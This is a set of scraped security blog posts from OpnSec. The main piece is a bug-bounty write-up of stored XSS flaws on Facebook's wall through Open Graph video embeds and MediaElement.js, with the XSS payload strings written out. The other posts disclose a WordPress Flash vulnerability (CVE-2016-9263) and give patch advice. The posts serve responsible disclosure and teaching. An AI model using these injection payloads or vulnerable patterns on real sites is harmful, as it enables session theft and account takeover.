=== Content from opnsec.com_7fdd09a3_20250126_034118.html ===

# [OpnSec](https://opnsec.com/)

## Open mind Security and Crypto!

## Primary Menu

[Skip to content](#content)
[OpnSec](https://opnsec.com/)

* [About Me](https://opnsec.com/about-me/ "About Me")

# Stored XSS on Facebook

March 18, 2018

¬†|

[2 Comments](https://opnsec.com/2018/03/stored-xss-on-facebook/#comments)

> tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph.
>
> When a user clicks to play the video, the XSS executes on facebook.com

### Introduction

I reported multiple stored XSS on Facebook wall in April 2017.¬†These stored XSS vulnerabilities were also present in WordPress so¬†I waited for WordPress to patch it before publishing this write-up. The vulnerabilities are now fixed on WordPress!

These XSS are a little bit complex because they require multiple steps, but each step by itself is pretty simple to understand.

### The Open Graph protocol

When you add a URL in a Facebook post, Facebook will use the [Open Graph protocol](http://ogp.me/)¬†([FB doc](https://developers.facebook.com/docs/sharing/webmasters/)) to display rich content. ¬†Here is a summary about how Facebook uses OG to embed external content in a FB post:

1. The attacker posts a URL on a FB post
2. FB server fetches the URL (server side) and reads the OG meta tags to extract info about the content of the URL (for example the content is a video with a title, a cover image, a video encoding type and a video file URL)
3. The victim views the FB post with the cover image and a play button
4. When the victim clicks on the play button, the video loads using the video info extracted from the OG meta tags. This is when the XSS will be executed

> This OG workflow is also used by many websites including Twitter and WordPress for example.
>
> Step #2 is sensitive: server-side fetching of a user provided URL, which can often lead to SSRF.
>
> Another potential vulnerability is Clickjacking if the hosting website uses X-Frame-Options: SAMEORIGIN on sensitive webpages and let the attacker inject arbitrary iframes on the same subdomain.
>
> FB wasn‚Äôt vulnerable to either of these issues.

The interesting part is #4 when FB loads the video after the victim clicks the play button. First, FB will send a XHR request to get the video type and the video file URL, which are both provided by the attacker in the¬†og:video:type (we‚Äôll call it ogVideoType) and the¬†og:video:secure\_url (ogVideoUrl) tags of the URL posted by the attacker. Here is a sample of OG meta tags:

```

<!DOCTYPE html>

<html>

<head>

<meta property="og:video:type" content="video/flv">

<meta property="og:video:secure_url" content='https://example.com/video.flv'>

<meta property="og:video:width" content="718">

<meta property="og:video:height" content="404">

<meta property="og:image" content="https://example.com/cover.jpg">

(...)

</head>

<body>

(...)

</body>

</html>

```

If¬†ogVideoType is ‚Äúiframe‚Äù or ‚Äúswf player‚Äù then FB loads an external iframe and doesn‚Äôt handle the playing of the video. Otherwise, FB was using [MediaElement.js](http://www.mediaelementjs.com/) to handle the loading of the video directly on facebook.com. I already reported and [disclosed vulnerabilities](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)¬†on the Flash component of ME.js on both Facebook and WordPress.

## 1. Stored XSS using FlashMediaElement.swf

MediaElements.js has multiple ways of playing a video depending on ogVideoType.

If ogVideoType is ‚Äúvideo/flv‚Äù (flash video), Facebook loads the Flash file FlashMediaElement.swf on facebook.com¬† (using an <embed> tag) and passes the ogVideoUrl to FlashME.swf to play the video. FlashME.swf then sends logs information to facebook.com (using Flash-to-javascript) about events like ‚Äúvideo played‚Äù or ‚Äúvideo ended‚Äù.¬†FlashME.swf handled correctly the Flash-to-javascript communication, in particular **\** was properly escaped to **\\** to avoid XSS.

However, the javascript code sent was :

```
setTimeout('log("[VIDEO_URL]")', 0)
```
> In javascript setTimeout is similar to eval, it will transform a string into instructions, making it very dangerous

[VIDEO\_URL] is controlled by the attacker, it‚Äôs the value of ogVideoUrl. If it contains **‚Äú** for example
```
http://evil.com/video.flv?"[payload]
```
Flash will send the following instruction to javascript:

```
setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);
```

As you can see, the **‚Äú** in **video.flv?\‚Äùpayload** is properly escaped so the attacker cannot escape from the setTimeout function.

However, when javascript executes the setTimeout function, it will execute the following javascript instruction :

```
log("http://evil.com/video.flv?"[payload]")
```

And this time **‚Äú** is not escaped any more and the attacker can inject XSS!

Now the question is whether Facebook escapes ogVideoUrl before passing it to FlashME.swf.

First, Facebook javascript sends a XHR request to Facebook server to get the value of ogVideoType and ogVideoUrl. The value of¬†ogVideoUrl is correctly encoded but it can contain any special character like
```
https://evil.com?"'<\
```

Then, before being sent to Flash, ogVideoUrl was transformed like this :

```
function absolutizeUrl(ogVideoUrl) {

var tempDiv = document.createElement('div');

tempDiv.innerHTML = '<a href="' + ogVideoUrl.toString().split('"').join('&quot;') + '">x</a>';

return tempDiv.firstChild.href;

}

flashDiv.innerHTML ='<embed src="FlashME.swf?videoFile=' +¬†encodeURI(absolutizeUrl(ogVideoUrl )) +'" type="application/x-shockwave-flash">';

```

The result of¬†absolutizeUrl(ogVideoUrl) is URL encoded before being sent to Flash but when Flash will receive the data it will automatically URL decode it once, so we can ignore the¬†encodeURI instruction.

absolutizeUrl transforms relative URL to absolute URL with the current protocol and domain of the javascript context (and if an¬†absolute URL is provided, it returns it almost unchanged). This seems ‚Äúhacky‚Äù but it seems secure enough and simple because we let the browser do the hard work. But it‚Äôs not simple when it comes to special character encoding!

When initially analyzing this code, I was using Firefox, because it had great extensions like Hackbar, Tamper Data and‚Ä¶ Firebug!

In Firefox, if you try
```
absolutizeUrl('http://evil.com/video.flv#"payload')
```
it will return
```
http://evil.com/video.flv#%22payload
```
so I was stuck because in Facebook the javascript instruction sent by Flash would be
```
setTimeout("log(\"http://evil.com/video.flv?%22payload\")", 0);
```
which will lead to
```
log("http://evil.com/video.flv?%22[payload]")
```
which is NOT an XSS.

And then I tried on Chrome and
```
absolutizeUrl('http://evil.com/video.flv#"payload')
```
returned
```
http://evil.com/video.flv#"payload
```
and **\o/ YEAH!!!!!**

Now Flash sends
```
setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);
```
to Facebook javascript and which will lead to
```
log("http://evil.com/video.flv?"[payload]")
```

So if ogVideoUrl is set to
```
http://evil.com/video.flv#"+alert(document.domain+" XSSed!")+"
```
then Facebook will execute
```
log("http://evil.com/video.flv?"+alert(document.domain+" XSSed!")+"")
```
and will display a nice little alert box saying ‚Äúfacebook.com XSSed!‚Äù üôÇ

> The reason of this is that when a browser parses a URL, it will encode special characters differently depending on the browser:
>
> * Firefox will URLencode any occurence of **‚Äú** in the url
> * Chrome, up to version 64, would URLencode **‚Äú** EXCEPT in the hash part (= fragment) of the URL (note: in the latest version 65 of Chrome, this behaviour changed and now Chrome behaves like Firefox and will URLencode ‚Äù even in the hash part
> * IE and Edge will NOT URLencode **‚Äú** in the hash part NOR the search part (= query) of the URL
> * Safari will¬†NOT URLencode **‚Äú** in the hash part
>
> As you can see it‚Äôs not great to let the browser decide how to encode special characters in URLs in your javascript code!

I reported the vulnerability right away to Facebook and they replied the next day and told me they modified the Flash file so that it doesn‚Äôt use¬†setTimeout any more,¬† the Flash would now send
```
log("http://evil.com/video.flv?\"payload")
```
and as you can see **‚Äú** is properly escaped to **\‚Äù** and there is no XSS any more.

## 2. Stored XSS without Flash

The previous XSS required Flash so I checked if I could find another payload without Flash.

If ogVideoType was ‚Äúvideo/vimeo‚Äù, the following code would execute

```
ogVideoUrl =¬†absolutizeUrl(ogVideoUrl);

ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);

playerDiv.innerHTML¬†= '<iframe src="https://player.vimeo.com/video/' + ogVideoUrl + '?api=1"></iframe>';

```

As you can see¬†absolutizeUrl(ogURL) is not urlencoded before being injected to¬†playerDiv.innerHTML, so with ogVideoUrl set to
```
http://evil.com/#" onload="alert(document.domain)"
```
playerDiv.innerHTML would be
```
<iframe src="https://player.vimeo.com/video/#" onload="alert(document.domain)" ?api=1"></iframe>
```

which is again an XSS on facebook.com!

I reported this on the same day the previous XSS was fixed and Facebook fixed it again in 1 day like this :

ogVideoUrl =¬†absolutizeUrl(ogVideoUrl);

ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);

playerDiv.innerHTML¬†= '<iframe src="https://player.vimeo.com/video/' + ogVideoUrl.split('"').join('&quot;')¬†+ '?api=1"></iframe>'

Here is a video of this XSS in action :

The next day, I found another vulnerable endpoint: when ogVideoType was something unknown, like ‚Äúvideo/nothing‚Äù, Facebook would display an error message with a link to ogVideoUrl  like this:

errorDiv.innerHTML¬†= '<a href="' +absolutizeUrl(ogVideoUrl ) + '">'

So with the ogVideoUrl¬†payload¬†https://opnsec.com/#"><img/src="xxx"onerror="alert(document.domain)¬†errorDiv.innerHTML would be¬†<a href="https://opnsec.com/#"><img src="xxx" onerror="alert(document.domain)">

I reported it to Facebook and, funny enough, Neil from Facebook WhiteHat told me he was planning to check this code the next day!

## 3. Oh, and one more thing‚Ä¶

Another possible ogVideoType was ‚Äúsilverlight‚Äù. [Silverlight](https://www.microsoft.com/silverlight/)¬†is a browser plugin by Microsoft and is to Flash what VBscript was to javascript.

The silverlight file hosted on Facebook (silverlightmediaelement.xap) was loaded like this:

params = ["file=" + ogVideoUrl, "id=playerID"];

silverlightDiv.innerHTML ='<object data="data:application/x-silverlight-2," type="application/x-silverlight-2"><param name="initParams" value="' + params.join(',').split('"').join('&quot;') + '" /></object>';

silverlightmediaelement.xap¬†would then send log information to Facebook javascript a little bit like the Flash file did, but this time it didn‚Äôt contain ogVideoUrl but only the player id, which is another parameter sent in¬†initParams and defined by Facebook. Silverlight would call the javascript function **[id]\_init()**¬†where [id] is ‚ÄúplayerID‚Äù.

In¬†silverlight, parameters are not separated by **&**¬†like in urls or in Flash but by **,**

If ogVideoUrl¬†contains a **,** then every thing after this comma will be considered as another parameter by silverlight, which means that using the payload¬† https://opnsec.com/#,id=alert(document.domain)&  then silverlight be loaded like this:

silverlightDiv.innerHTML ='<object data="data:application/x-silverlight-2," type="application/x-silverlight-2"><param name="initParams" value="file=https://opnsec.com/#,id=alert(document.domain)&,id=playerID" /></object>';

Silverlight will only take into account the first occurence of id and it will set its value to¬† alert(document.domain)&

Silverlight will then call the following javascript :¬† alert(document.domain)&\_init()  which means XSS again!

I reported it the same day and Neal replied that they would remove all the MediaElement component and replace it with a new way of handling external videos!

## What about WordPress ?

All this vulnerable code wasn‚Äôt developed by Facebook, they used an open source library¬†[MediaElementjs](http://www.mediaelementjs.com/)¬†which was (and still is) a popular module to embed video in a webpage, especially because they had a Flash fallback for older browsers. In particular, WordPress uses this module by default when handling [shortcodes](https://codex.wordpress.org/Shortcode_API). The vulnerabilities were also present in WordPress and allowed stored XSS in WordPress comments or in WordPress articles written by authors (in WordPress, the Author role isn‚Äôt allowed to execute javascript).

I reported the vulnerabilities to WordPress to which I already reported [another vulnerability](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)¬†monthes before. They informed MediaElementjs team about this and told me they were working on a fix. On February 2018 they finally released the fix for all the XSS related to MediaElementjs.

## Conclusion

I learned a lot and had a lot of fun finding these vulnerabilities. I hope you also enjoy it!

Here is some advices :

> Open Graph (and alternatives like json-ld) is a great way to display rich external content on a website, but you should be careful about it (think SSRF, XSS and Clickjacking)
>
> Don‚Äôt let the browser parse URL for you in your javascript code, each browser handles it his own way and a browser can change its behavior anytime (like Chrome 64 -> 65). Use white-list regex instead.
>
> Complex, dynamic XSSes that use XHR, DOM mutations, and external content will NOT be detected by automatic tools (for now). So even the most secure, high profile website can be vulnerable. Code review and debugging are the way to go for these!
>
> Don‚Äôt be afraid of large, minified, dynamic javascript source code. If you spot some potentially dangerous features on a website, you‚Äôre free to check how it is implemented!
>
> Facebook WhiteHat is a great Bug Bounty program! Thanks Neal and all the team üôÇ

Thanks for reading, and feel free to comment if something isn‚Äôt clear.

Happy hunting !

[Tweet](https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2018%2F03%2Fstored-xss-on-facebook%2F&via=opnsec)

[Uncategorized](https://opnsec.com/category/uncategorized/)
 ¬†[Facebook](https://opnsec.com/tag/facebook/), [XSS](https://opnsec.com/tag/xss/)

## 2 comments on ‚ÄúStored XSS on Facebook‚Äù

* ![](https://secure.gravatar.com/avatar/1309cc53e3413c79b54d698361f1076d?s=60&d=mm&r=g) [default\_user](http://none-) says:
  [March 18, 2018 at 9:36 pm](https://opnsec.com/2018/03/stored-xss-on-facebook/#comment-464)

  Firstly , WOW, like what the heck man who are you :p . You don‚Äôt happen to be a js developer by any chance right ?
* ![](https://secure.gravatar.com/avatar/8c7af768876dd6cf85a41a7661d83556?s=60&d=mm&r=g) Florian V says:
  [July 13, 2018 at 12:22 pm](https://opnsec.com/2018/03/stored-xss-on-facebook/#comment-799)

  Amazing and inspiring, thank you ! üôÇ

Comments are closed.

Search for:

## Recent Posts

* [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)
* [Into the Borg ‚Äì SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)
* [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)
* [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)
* [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)
## Recent Comments

* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-48064)
* vahhitiu on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-47020)
* Just a nOob on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46910)
* Nani on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46019)
* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-45513)

# Footer Menu

* [Top](#page "Back to top of page")
* [Home](https://opnsec.com "Home")

¬© 2025 [OpnSec](https://opnsec.com/). Theme by [XtremelySocial](http://xtremelysocial.com/wordpress/flat/).



=== Content from opnsec.com_18ec4d3c_20250126_034118.html ===

# [OpnSec](https://opnsec.com/)

## Open mind Security and Crypto!

## Primary Menu

[Skip to content](#content)
[OpnSec](https://opnsec.com/)

* [About Me](https://opnsec.com/about-me/ "About Me")

# FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]

October 19, 2017

¬†|

[3 Comments](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/#comments)

![](http://opnsec.com/wp-content/uploads/2017/10/FlashMEcropped-150x150.png)Last week, I disclosed the existence of an unpatched Flash vulnerability on WordPress (<https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/>). Today, I disclose technical details about this vulnerability. However, contrary to what I announced before, I won‚Äôt provide a POC nor enough technical details to allow attackers to exploit it. Responsible disclosure of unpatched vulnerabilities is never easy, and I‚Äôm trying to do this right both ethically and legally.

If you want to know more about the type of vulnerability, the impact and how to patch it please refer to <https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/>.

### Technical details

WordPress uses an independent open-source tool to play videos in a webpage, MediaElement.js. ME.js provides a Flash fallback for browsers that don‚Äôt support the <video> tag or certain video codecs, using the flash file FlashMediaElement.swf. Vulnerabilities on this file have been reported in the past, like the awesome Flash based XSS found by [cure53](https://twitter.com/cure53berlin) <https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c>.

While investigating the source of this file in summer 2016, one particular instruction catched my attention

```
Security.allowDomain("www.[XYZ].com");
```
> Note: I changed the real name of the domain to [XYZ].com

[Security.allowDomain()](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Security.html#allowDomain()) can be described as a vulnerable function: using it will downplay the [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) which is the basis of website client-side security. You can read more about Flash security sandbox model [here](http://www.senocular.com/flash/tutorials/contentdomains/).

This code will allow a Flash file hosted on [XYZ].com to execute code on the FlashMediaElement.swf file, which is hosted on the WordPress site domain. [XYZ].com is a very well established company, so you could safely think that they would not use this privilege to execute malicious code on your website, the same way you would allow Google Analytics or Youtube to run scripts on your website. However, it is not that simple. With Security.allowDomain(‚Äúwww.[XYZ].com‚Äù), you allow not only one specific file hosted on [XYZ].com to access your Flash security sandbox but any Flash file hosted on [XYZ].com.

> Quick reminder about [Cross-Site Scripting](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29):¬†XSS is the ability to execute arbitrary code (script, in this case Flash ActionScript3) in an external website. Not only a XSS allows you to access private info (like cookies) and private functions (like xhr requests) on the external website, but the arbitrary code will also be considered by the browser (or the Flash player) to be originating from the vulnerable website. This subtlety is what we will exploit here.

The thing is that [XYZ].com is vulnerable itself to XSS, or in this case Cross-Site Flashing. Which means that an attacker can execute arbitrary Flash code that will be considered by the Flash player as being originating from [XYZ].com. This forms a chain of vulnerabilities that will end up with any WordPress website being vulnerable to Cross-Site Flashing. Let‚Äôs make a drawing:

[![](http://opnsec.com/wp-content/uploads/2017/10/FlashME.svg)](http://opnsec.com/wp-content/uploads/2017/10/FlashME.svg)

### Facebook was vulnerable, too

A few months after reporting this issue, I was investigating various Flash files on facebook.com. One file contained the following instruction:

```
Security.allowDomain("www.[XYZ].com");
```

Facebook was using a file similar to flashmediaelement.swf to embed external videos on Facebook wall. The same vulnerability was present in this file and I was able to create various POC exploits using this vulnerability that would lead to Facebook OAuth bypass and even Facebook account takeover without user interaction.

I reported the issue to [Facebook WhiteHat](https://www.facebook.com/whitehat) program and Facebook Security Team quickly fixed the issue and generously rewarded me.

### Conclusion

This vulnerability is complex because it relies on multiple factors, technologies and companies. However, once an attacker is able to create an exploit, exploiting this vulnerability is easy because all of the requirements are usually present by default on a system. This vulnerability not only affects WordPress websites, but every websites hosted on the same subdomain as a WordPress website.

I hope WordPress will patch this issue soon and that my report will help raise awareness about Chained XSS vulnerabilities. Thanks for reading!

[Tweet](https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F10%2Fflashme-wordpress-vulnerability-disclosure-cve-2016-9263%2F&via=opnsec)

[Uncategorized](https://opnsec.com/category/uncategorized/)

## 3 comments on ‚ÄúFlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]‚Äù

* ![](https://secure.gravatar.com/avatar/4abd7baa11a5a46eda78d648f643ee40?s=60&d=mm&r=g) [PHPNinja](http://www.phpninja.info/en/home) says:
  [November 6, 2017 at 10:31 am](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/#comment-153)

  Wow, ok, now it makes sense. I was trying to understand some of this thing and I was finding it very hard untill I got here üôÇ Thank you very much!!
* ![](https://secure.gravatar.com/avatar/6143cc7f2c3169c23ddaa6c2395fdecc?s=60&d=mm&r=g) flashpie says:
  [November 6, 2017 at 10:26 pm](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/#comment-154)

  Thank you for this post. Why does [XYZ].com not fix the XSF?
* ![](https://secure.gravatar.com/avatar/a508c0b6d30524ba8650c49fb55e3e33?s=60&d=mm&r=g) [Agung Dirgantara ( @agoenks29D )](http://www.agungdirgantara.id) says:
  [November 29, 2017 at 3:34 am](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/#comment-172)

  Nice

Comments are closed.

Search for:

## Recent Posts

* [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)
* [Into the Borg ‚Äì SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)
* [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)
* [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)
* [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)
## Recent Comments

* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-48064)
* vahhitiu on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-47020)
* Just a nOob on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46910)
* Nani on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46019)
* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-45513)

# Footer Menu

* [Top](#page "Back to top of page")
* [Home](https://opnsec.com "Home")

¬© 2025 [OpnSec](https://opnsec.com/). Theme by [XtremelySocial](http://xtremelysocial.com/wordpress/flat/).



=== Content from opnsec.com_deb503e1_20250126_034119.html ===

# [OpnSec](https://opnsec.com/)

## Open mind Security and Crypto!

## Primary Menu

[Skip to content](#content)
[OpnSec](https://opnsec.com/)

* [About Me](https://opnsec.com/about-me/ "About Me")

# Uncategorized

# [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)

tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph. When a user clicks to play the video, the XSS executes on facebook.com Introduction I reported multiple stored XSS on Facebook wall in April 2017.¬†These stored XSS vulnerabilities were also present in WordPress so¬†I waited for WordPress to patch it before‚Ä¶ [Read More](https://opnsec.com/2018/03/stored-xss-on-facebook/)

---

# [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)

Last week, I disclosed the existence of an unpatched Flash vulnerability on WordPress (https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/). Today, I disclose technical details about this vulnerability. However, contrary to what I announced before, I won‚Äôt provide a POC nor enough technical details to allow attackers to exploit it. Responsible disclosure of unpatched vulnerabilities is never easy, and I‚Äôm trying‚Ä¶ [Read More](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)

---

# [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)

Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017 What is the vulnerability ? There is an unpatched vulnerability in latest and older WordPress releases. The vulnerability is a cross-domain Flash injection (XSF), which impact‚Ä¶ [Read More](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)

---

Search for:

## Recent Posts

* [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/)
* [Into the Borg ‚Äì SSRF inside Google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)
* [Stored XSS on Facebook](https://opnsec.com/2018/03/stored-xss-on-facebook/)
* [FlashME! ‚Äì WordPress vulnerability disclosure [CVE-2016-9263]](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)
* [[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/)
## Recent Comments

* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-48064)
* vahhitiu on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-47020)
* Just a nOob on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46910)
* Nani on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-46019)
* [Engue Gillier](https://opnsec.com) on [DOM XSS in Gmail with a little help from Chrome](https://opnsec.com/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comment-45513)

# Footer Menu

* [Top](#page "Back to top of page")
* [Home](https://opnsec.com "Home")

¬© 2025 [OpnSec](https://opnsec.com/). Theme by [XtremelySocial](http://xtremelysocial.com/wordpress/flat/).



=== Content from opnsec.com_5a39b92c_20250126_034117.html ===

# [OpnSec](https://opnsec.com/)

## Open mind Security and Crypto!

## Primary Menu

[Skip to content](#content)
[OpnSec](https://opnsec.com/)

* [About Me](https://opnsec.com/about-me/ "About Me")

# [CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]

October 12, 2017

¬†|

[3 Comments](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comments)

###

##### **Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017**

### What is the vulnerability ?

There is an **unpatched vulnerability in latest and older WordPress releases**. The vulnerability is a cross-domain Flash injection (**XSF**), which impact is **similar to a Reflected XSS** (or Same-Origin policy bypass).

The vulnerable file is located at /wp-includes/js/mediaelement/**flashmediaelement.swf**.

### Who is affected ?

Any up-to-date or older (for at least 2 years) version of WordPress is vulnerable by default. **Every WordPress website is vulnerable** to this as well as **any other website hosted on the same subdomain** as a WordPress website.

The only WordPress websites that are not affected are those where the vulnerable file, flashmediaelement.swf, is hosted on a sandboxed domain. This is the case for sites hosted on wordpress.com for example.

### What is the impact ?

The impact is similar to an (authenticated) Reflected XSS, except you can‚Äôt manipulate the DOM and read some values like header responses, and the victim must have Flash active. The attacker can send a malicious link that would execute arbitrary Flash code on the WordPress security sandbox. When a victim opens the malicious link, the attacker can perform ‚Äúxhr style‚Äù requests with Flash to any URL in the WordPress domain, using the victim‚Äôs cookies. Attacker can then read the response source code (body) and steal the victims private info including any CSRF token. He can use the CSRF token to perform CSRF actions on behalf of the user. In the case of Facebook for example, this led to Facebook account takeover after the victim clicked on the malicious link.

Because this is a Same-Origin policy bypass, the attacker can exploit this not only on the vulnerable WordPress site but also on any website located in the same subdomain (or same Origin) than the vulnerable WordPress site.

### How to patch this ?

WordPress decided not to patch this issue for some (bad?) reasons. You should simply **remove the vulnerable file** at [WordPress\_Home\_URL]/wp-includes/js/mediaelement/flashmediaelement.swf (which is just a Flash fallback for embed videos not hosted on a streaming website).

Or you can **redirect** [WordPress\_Home\_URL]/wp-includes/js/mediaelement/flashmediaelement.swf **to a sandboxed domain**, for example to https://x0.wp.com/wp-includes/js/mediaelement/flashmediaelement.swf.

Either of these solutions will mitigate this issue.

### What is the timeline of this vulnerability report ?

* Aug 5th **2016**: I reported this issue to Automattic, then WordPress private Bug Bounty program, more than a year ago. WordPress contacted the author of the vulnerable code, mediaelement.js (created by John Dyer @johndyer), which provided a patched file very quickly. WordPress decided not to release the patch.
* Sep 15th 2016: I found that Facebook was using the same vulnerable code, so **facebook.com was vulnerable to the same XSF vulnerability** (similar to a reflected XSS on facebook.com). I reported it to Facebook which fixed it in 5 days.
* Nov 11th 2016: I requested a CVE for this to MITRE and was assigned **CVE-2016-9263**
* Sep 15th **2017**: I informed WordPress Security Team that I was going to publicly disclose CVE-2016-9263
* Oct 12th 2017: I publicly disclose the issue on my blog without any technical detail but with instructions how to patch.
* **Oct 19th 2017: I will publicly disclose technical details** about this vulnerability, including **how to exploit it** [UPDATE]: **Limited technical details** are now available [**here**](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)

### Why are you publicly disclosing this ?

I reported this issue to WordPress more than a year ago, with a working proof of concept, technical details and how to patch the issue. WordPress choose not to release the patch quickly provided by mediaelement.js team. On the other hand, Facebook patched the issue in 5 days. WordPress obviously has less resource than Facebook but this is not a valid excuse because it is the most used Website software in the world, and the patch has been ready for more than a year. They made a poor decision that endangers their users and many websites.

I already reported this vulnerability to large websites like Uber, Spotify, etc‚Ä¶¬† for many of which their main website was vulnerable because of this vulnerability in their WordPress site. Many of them patched it themselves. It is possible that this is now exploited as a consequence of the reports I sent to these organisations. I don‚Äôt accept that the public is not informed about this vulnerability.

**Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017.**

### How can I contact you ?

You can find me on twitter (**@opnsec**). You can also contact me at wordpress /at\ opnsec /dot\ com.

[Tweet](https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F10%2Fcve-2016-9263-unpatched-xsf-vulnerability-in-wordpress%2F&via=opnsec)

[Uncategorized](https://opnsec.com/category/uncategorized/)

## 3 comments on ‚Äú[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]‚Äù

* ![](https://secure.gravatar.com/avatar/4e61542961bb8308fd47f926f927766e?s=60&d=mm&r=g) Andy Thompson says:
  [October 13, 2017 at 10:11 am](https://opnsec.com/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comment-120)

  Does this satisfy your concern that Automattic is continuing to ignore the issue?

  <https://github.com/023yangbo/WordPress/pull/12> ‚Äì merged Sep 3 and presumably will be in the WordPress 4.9 release.
